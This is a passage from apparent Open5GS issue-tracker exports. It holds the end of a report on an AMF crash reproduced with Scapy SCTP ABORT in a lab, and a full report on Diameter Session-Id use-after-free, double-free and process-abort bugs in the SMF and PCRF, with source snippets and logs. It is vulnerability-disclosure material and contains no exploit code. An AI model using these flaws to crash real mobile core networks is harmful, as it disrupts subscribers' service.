- All active UE sessions are dropped until AMF restarts.

Reproduction results:

- Scapy SCTP ABORT method: 5/5 successful reproductions under controlled lab conditions.
- Additional validation: graceful SCTP shutdown via lab gNB SIGTERM reproduced the same AMF crash condition.

Observed crash:

```
05/03 15:43:28.651: [amf] FATAL: amf_nnrf_handle_nf_discover:
    Assertion `ran_ue' failed. (../src/amf/nnrf-handler.c:89)
```

### eNodeB/gNodeB

UERANSIM v3.2.8

### UE Models and versions

UERANSIM v3.2.8

items.title: [Bug]: SMF/PCRF Diameter Session-Id lifetime issues can cause use-after-free and SMF abort

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

The issue was observed in a IMS environment using Gx.

The SMF maintains the Diameter Session-Id in both the SMF session context and the freeDiameter session state. The SMF session context currently stores the Session-Id by aliasing the buffer owned by the Diameter session state:

```c
sess->gx_sid = (char *)sess_data->gx_sid;
```

The same pattern exists for `gy_sid` and `s6b_sid`.

When the Diameter session is terminated, `state_cleanup()` releases the Session-Id owned by `sess_data`. The corresponding `smf_sess_t` can still be alive at that point, leaving `sess->gx_sid`, `sess->gy_sid`, or `sess->s6b_sid` pointing to freed memory.

A later request can use the stale Session-Id while constructing a Diameter request:

```c
size_t sidlen = strlen(sess->gx_sid);
ogs_diam_message_session_id_set(
        req, (os0_t)sess->gx_sid, sidlen);
```

There is also an ownership problem in the opposite direction. Some recovery paths free `sess->gx_sid`, `sess->gy_sid`, or `sess->s6b_sid`, although these pointers currently refer to buffers owned by the Diameter session state.

A similar lifetime problem exists in PCRF. The IP-address-to-Gx-Session-Id hash stores both the key and value using memory owned by the Gx session state. `ogs_hash_t` retains the supplied pointers rather than making copies.

The PCRF lookup functions also return the stored Session-Id pointer after releasing the hash lock. The Rx thread can therefore continue using that pointer while a concurrent Gx session cleanup releases the underlying session state.

In addition, when a subsequent CC-Request changes the address stored in `sess_data->addr`, the hash key can be modified in place while remaining in the bucket selected for its previous value.

### Logs

```shell
A `smf-ims` process terminated with the following error:


[diam] ERROR: fd_sess_new@sessions.c:405:
    Invalid parameter '(fd_os_is_valid_os0(opt, optlen))', 22

[diam] ERROR: fd_sess_fromsid_msg@sessions.c:556:
    Invalid argument

[diam] ERROR: fd_msg_sess_get@messages.c:1522:
    Invalid argument

[smf] FATAL: smf_gx_cca_cb:
    Assertion `ret == 0' failed.
    (../src/smf/gx-path.c:793)


`fd_msg_sess_get()` can fail when freeDiameter cannot construct or retrieve a session from the Session-Id contained in a received Diameter answer.

The failure confirms that such an error currently reaches:


ret = fd_msg_sess_get(
        fd_g_config->cnf_dict, *msg, &session, &new);
ogs_assert(ret == 0);


and aborts the entire SMF process.
```

### Expected behaviour

Diameter Session-Id ownership should be explicit and independent between components with different lifetimes.

The SMF session context should own its own copy of the Gx, Gy, and S6b Session-Ids rather than retaining pointers owned by the freeDiameter session state.

The PCRF IP-to-Session-Id hash should similarly own both its key and Session-Id value. A lookup result used outside the hash lock should remain valid even if the corresponding Gx session is concurrently removed.

Changing an address in a Gx session should not mutate a key that is already stored inside the hash.

Finally, failure of `fd_msg_sess_get()` while processing an incoming Diameter answer should be treated as an invalid/unusable answer. It should be logged and discarded rather than terminating the entire SMF process.

### Observed Behaviour

The SMF session context and Diameter session state currently share the same Session-Id allocation.

When `state_cleanup()` releases the Diameter session state, the SMF session context can retain a dangling Session-Id pointer. Conversely, recovery code can free the aliased pointer while it is still owned by the Diameter session state.

This creates use-after-free and possible double-free conditions across the Gx, Gy, and S6b paths.

The PCRF IP-to-Session-Id hash also stores pointers into Gx session state rather than owning its entries. As a result:

- the stored Session-Id can become dangling when the Gx session state is released;
- a lookup can return a pointer that becomes invalid after the hash lock is released;
- modifying `sess_data->addr` can modify a hash key in place, leaving the entry in the wrong hash bucket and preventing normal lookup or removal.

Separately, the SMF currently assumes that `fd_msg_sess_get()` always succeeds in the Gx, Gy, and S6b answer callbacks. An invalid Session-Id in a received answer therefore reaches `ogs_assert(ret == 0)` and aborts the process instead of dropping the affected Diameter answer.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_
